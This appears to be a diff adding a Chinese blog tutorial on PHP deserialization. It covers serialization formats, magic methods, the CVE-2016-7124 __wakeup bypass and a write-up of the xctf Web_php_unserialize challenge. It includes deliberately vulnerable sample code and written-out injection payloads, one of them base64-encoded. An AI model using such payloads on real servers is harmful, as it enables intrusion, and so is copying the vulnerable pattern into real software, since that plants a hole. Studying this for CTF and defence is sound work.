@@ -200,7 +200,70 @@
       </header>
     
     <div class="article-entry" itemprop="articleBody">
-    
+
+
+	
+		<h1 id="php的序列号与反序列化"><a href="#php的序列号与反序列化" class="headerlink" title="php的序列号与反序列化"></a>php的序列号与反序列化</h1><h2 id="0X00-序列化"><a href="#0X00-序列化" class="headerlink" title="0X00 序列化"></a>0X00 序列化</h2><p>serialize()函数将一个对象转换为字符串形式</p>
+<p>我们来看一下直接输出对象是什么效果的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name=<span class="string">"ghtwf01"</span>;</span><br><span class="line">	<span class="keyword">public</span> $age=<span class="string">"18"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a=<span class="keyword">new</span> test();</span><br><span class="line">	print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025114330014.png" alt="image-20201025114330014"></p>
+<a id="more"></a>
+
+<p>这个时候我们利用serialize()函数将这个对象进行序列化成字符串然后输出，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">"ghtwf01"</span></span><br><span class="line">    <span class="keyword">public</span> $age=<span class="string">"18"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a=<span class="keyword">new</span> test();</span><br><span class="line">	$a=serialize($a);</span><br><span class="line">	print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025115202868.png" alt="image-20201025115202868"></p>
+<p>如果不是public方法那么后面的读取方法就有点不一样，例如代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">"ghtwf01"</span>;</span><br><span class="line">    <span class="keyword">private</span> $age=<span class="string">"18"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $sex=<span class="string">"man"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a=<span class="keyword">new</span> test();</span><br><span class="line">	$a=serialize($a);</span><br><span class="line">	print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下 ：</p>
+<p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025142546176.png" alt="image-20201025142546176"></p>
+<p>private分析：</p>
+<p>这样就发现本来是age结果上面出现的是testage，而且testage长度为7，但是上面显示的是9。</p>
+<p>查找资料后发现private属性序列化的时候格式是%00类名%00成员名，%00占一个字节长度，所以age加了类名后变成了testage长度为9。</p>
+<p>protect分析：</p>
+<p>本来是sex结果上面出现的是*sex，而且*sex的长度是4，但是上面显示的6。</p>
+<p>查找资料后发现protect属性序列化的时候格式是%00%00成员名</p>
+<p>这里介绍一下public、private、protect的区别</p>
+<p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025143701471.png" alt="image-20201025143701471"></p>
+<h2 id="0X01-反序列化"><a href="#0X01-反序列化" class="headerlink" title="0X01 反序列化"></a>0X01 反序列化</h2><p>定义：反序列化就是利用unseralize()函数将一个经过序列化的字符串还原成php代码形式。</p>
+<p>代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $b=<span class="string">"序列化字符串"</span>;</span><br><span class="line">	$b=unserialize($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0X02-反序列化漏洞原理"><a href="#0X02-反序列化漏洞原理" class="headerlink" title="0X02 反序列化漏洞原理"></a>0X02 反序列化漏洞原理</h2><p>到这儿也许大家会想着序列化过去再反序列化回来，不就是形式之间的转换吗，和漏洞有什么关系？</p>
+<p>这里先掌握php常见的魔术方法，先列出几个最常见的魔术方法。</p>
+<p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025144356849.png" alt="image-20201025144356849"></p>
+<h3 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a>CVE-2016-7124 __wakeup绕过</h3><h4 id="wakeup-魔法函数简介"><a href="#wakeup-魔法函数简介" class="headerlink" title="__wakeup 魔法函数简介"></a>__wakeup 魔法函数简介</h4><p>unserialize()会检查是否存在一个 __wakeup()方法。如果存在，则会先调用 __wakeup()方法，预先准备对象需要的资源。</p>
+<p>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。</p>
+<p><strong>漏洞影响版本</strong></p>
+<p>php5&lt;5.6.25</p>
+<p>php7&lt;7.0.10</p>
+<p><strong>漏洞复现</strong></p>
+<p>代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $target=<span class="string">"test"</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">$this</span>-&gt;target=<span class="string">"wakeup!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">  			$fp=fopen(<span class="string">"D:\ProgramFiles\PHPTutorial\WWW\zx\hello.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">        	fputs($fp,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        	fclose($fp);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$a=$_GET[<span class="string">'test'</span>];</span><br><span class="line">	$b=unserialize($a);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"hello.php"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"./hello.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>魔法函数__wakeup()要比__destruct()先执行，所以我们传入</p>
+<p>O:1:”A”:1:{s:6:”target”;s:18:”<?php phpinfo();?>‘’;}</p>
+<p>时会被先执行的__wakeup()函数$target赋值覆盖为wakeup!，然后生成的hello.php里面的内容就是wakeup！</p>
+<p>传入?test=O:1:”A”:1:{s:6:”target”;s:18:”<?php phpinfo();?>‘’;}</p>
+<p>会返回：<br>hello.php</p>
+<p>wakeup!</p>
+<p>现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行，对象个数原来是1我们将其改为2，也就是</p>
+<p>?test=O:1:”A”:2:{s:6:”target”;s:18:”<?php phpinfo();?>‘’;}</p>
+<p>就能实现绕过。</p>
+<h2 id="0X03-xctf-Web-php-unserialize"><a href="#0X03-xctf-Web-php-unserialize" class="headerlink" title="0X03 xctf Web_php_unserialize"></a>0X03 xctf Web_php_unserialize</h2><p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025152734105.png" alt="image-20201025152734105"></p>
+<p>构造payload：?var=O:4:”Demo”:2:{s:10:”%00Demo%00file”;s:8:”f14g.php”}</p>
+<p>先把%00进行一次url解码：</p>
+<p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025153757010.png" alt="image-20201025153757010"></p>
+<p>然后进行一次base64编码得到payload：</p>
+<p>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p>
+<p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025153925448.png" alt="image-20201025153925448"></p>
+<p>拿下flag</p>
+
+	
 
       
         <h1 id="php的序列号与反序列化"><a href="#php的序列号与反序列化" class="headerlink" title="php的序列号与反序列化"></a>php的序列号与反序列化</h1><h2 id="0X00-序列化"><a href="#0X00-序列化" class="headerlink" title="0X00 序列化"></a>0X00 序列化</h2><p>serialize()函数将一个对象转换为字符串形式</p>
